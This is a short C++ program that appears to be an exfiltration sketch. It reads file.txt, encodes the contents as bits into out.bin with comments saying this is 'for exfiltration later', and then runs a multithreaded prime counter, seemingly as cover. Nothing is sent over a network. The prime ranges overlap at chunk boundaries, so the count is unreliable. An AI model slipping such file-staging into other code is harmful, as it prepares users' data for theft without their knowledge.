#include <iostream>
#include <fstream>
#include <string>
#include <bitset>

#include <iostream>
#include <thread>
#include <vector>
#include <utility>
#include <algorithm>
#include <functional>
#include <mutex>
#include <future>

using namespace std;

int prime(int a, int b)
{
    int primes = 0;
    for (a; a <= b; a++) {
        int i = 2;
        while (i <= a) {
            if (a % i == 0)
                break;
            i++;
        }
        if (i == a) {
            primes++;
        }
    }
    return primes;
}


int workConsumingPrime(vector<pair<int, int>>& workQueue, mutex& workMutex)
{
    int primes = 0;
    unique_lock<mutex> workLock(workMutex);
    while (!workQueue.empty()) {
        pair<int, int> work = workQueue.back();
        workQueue.pop_back();

        workLock.unlock(); //< Don't hold the mutex while we do our work.
        primes += prime(work.first, work.second);
        workLock.lock();
    }
    return primes;
}

int main(){
  string myString = "";
  string line;
  ifstream infile("file.txt");//open the file we're interested in
  if (infile.is_open()){
    while (getline(infile,line)){
      myString = myString + line;//save the content into the myString variable
    }
    infile.close();//close the file
  }
  ofstream outfile;
  outfile.open("out.bin");//open the file we will use for exfiltration later
  for (std::size_t i = 0; i < myString.size(); ++i){ //convert text to binary ready form exfiltration
      outfile << bitset<8>(myString.c_str()[i]);//write the binary into the file out.bin
    }
  outfile.close();//close the binary file




  int nthreads = thread::hardware_concurrency();
      int limit = 1000000;

      // A place to put work to be consumed, and a synchronisation object to protect it.
      vector<pair<int, int>> workQueue;
      mutex workMutex;

      // Put all of the ranges into a queue for the threads to consume.
      int chunkSize = max(limit / (nthreads*16), 10); //< Handwaving came picking 16 and a good factor.
      for (int i = 0; i < limit; i += chunkSize) {
          workQueue.push_back(make_pair(i, min(limit, i + chunkSize)));
      }

      // Start the threads.
      vector<future<int>> futures;
      for (int i = 0; i < nthreads; ++i) {
          packaged_task<int()> task(bind(workConsumingPrime, ref(workQueue), ref(workMutex)));
          futures.push_back(task.get_future());
          thread(move(task)).detach();
      }

      cout << "Number of logical cores: " << nthreads << "\n";
      cout << "Calculating number of primes less than " << limit << "... \n";

      // Sum up all the results.
      int primes = 0;
      for (future<int>& f : futures) {
          primes += f.get();
      }

      cout << "There are " << primes << " prime numbers less than " << limit << ".\n";


}
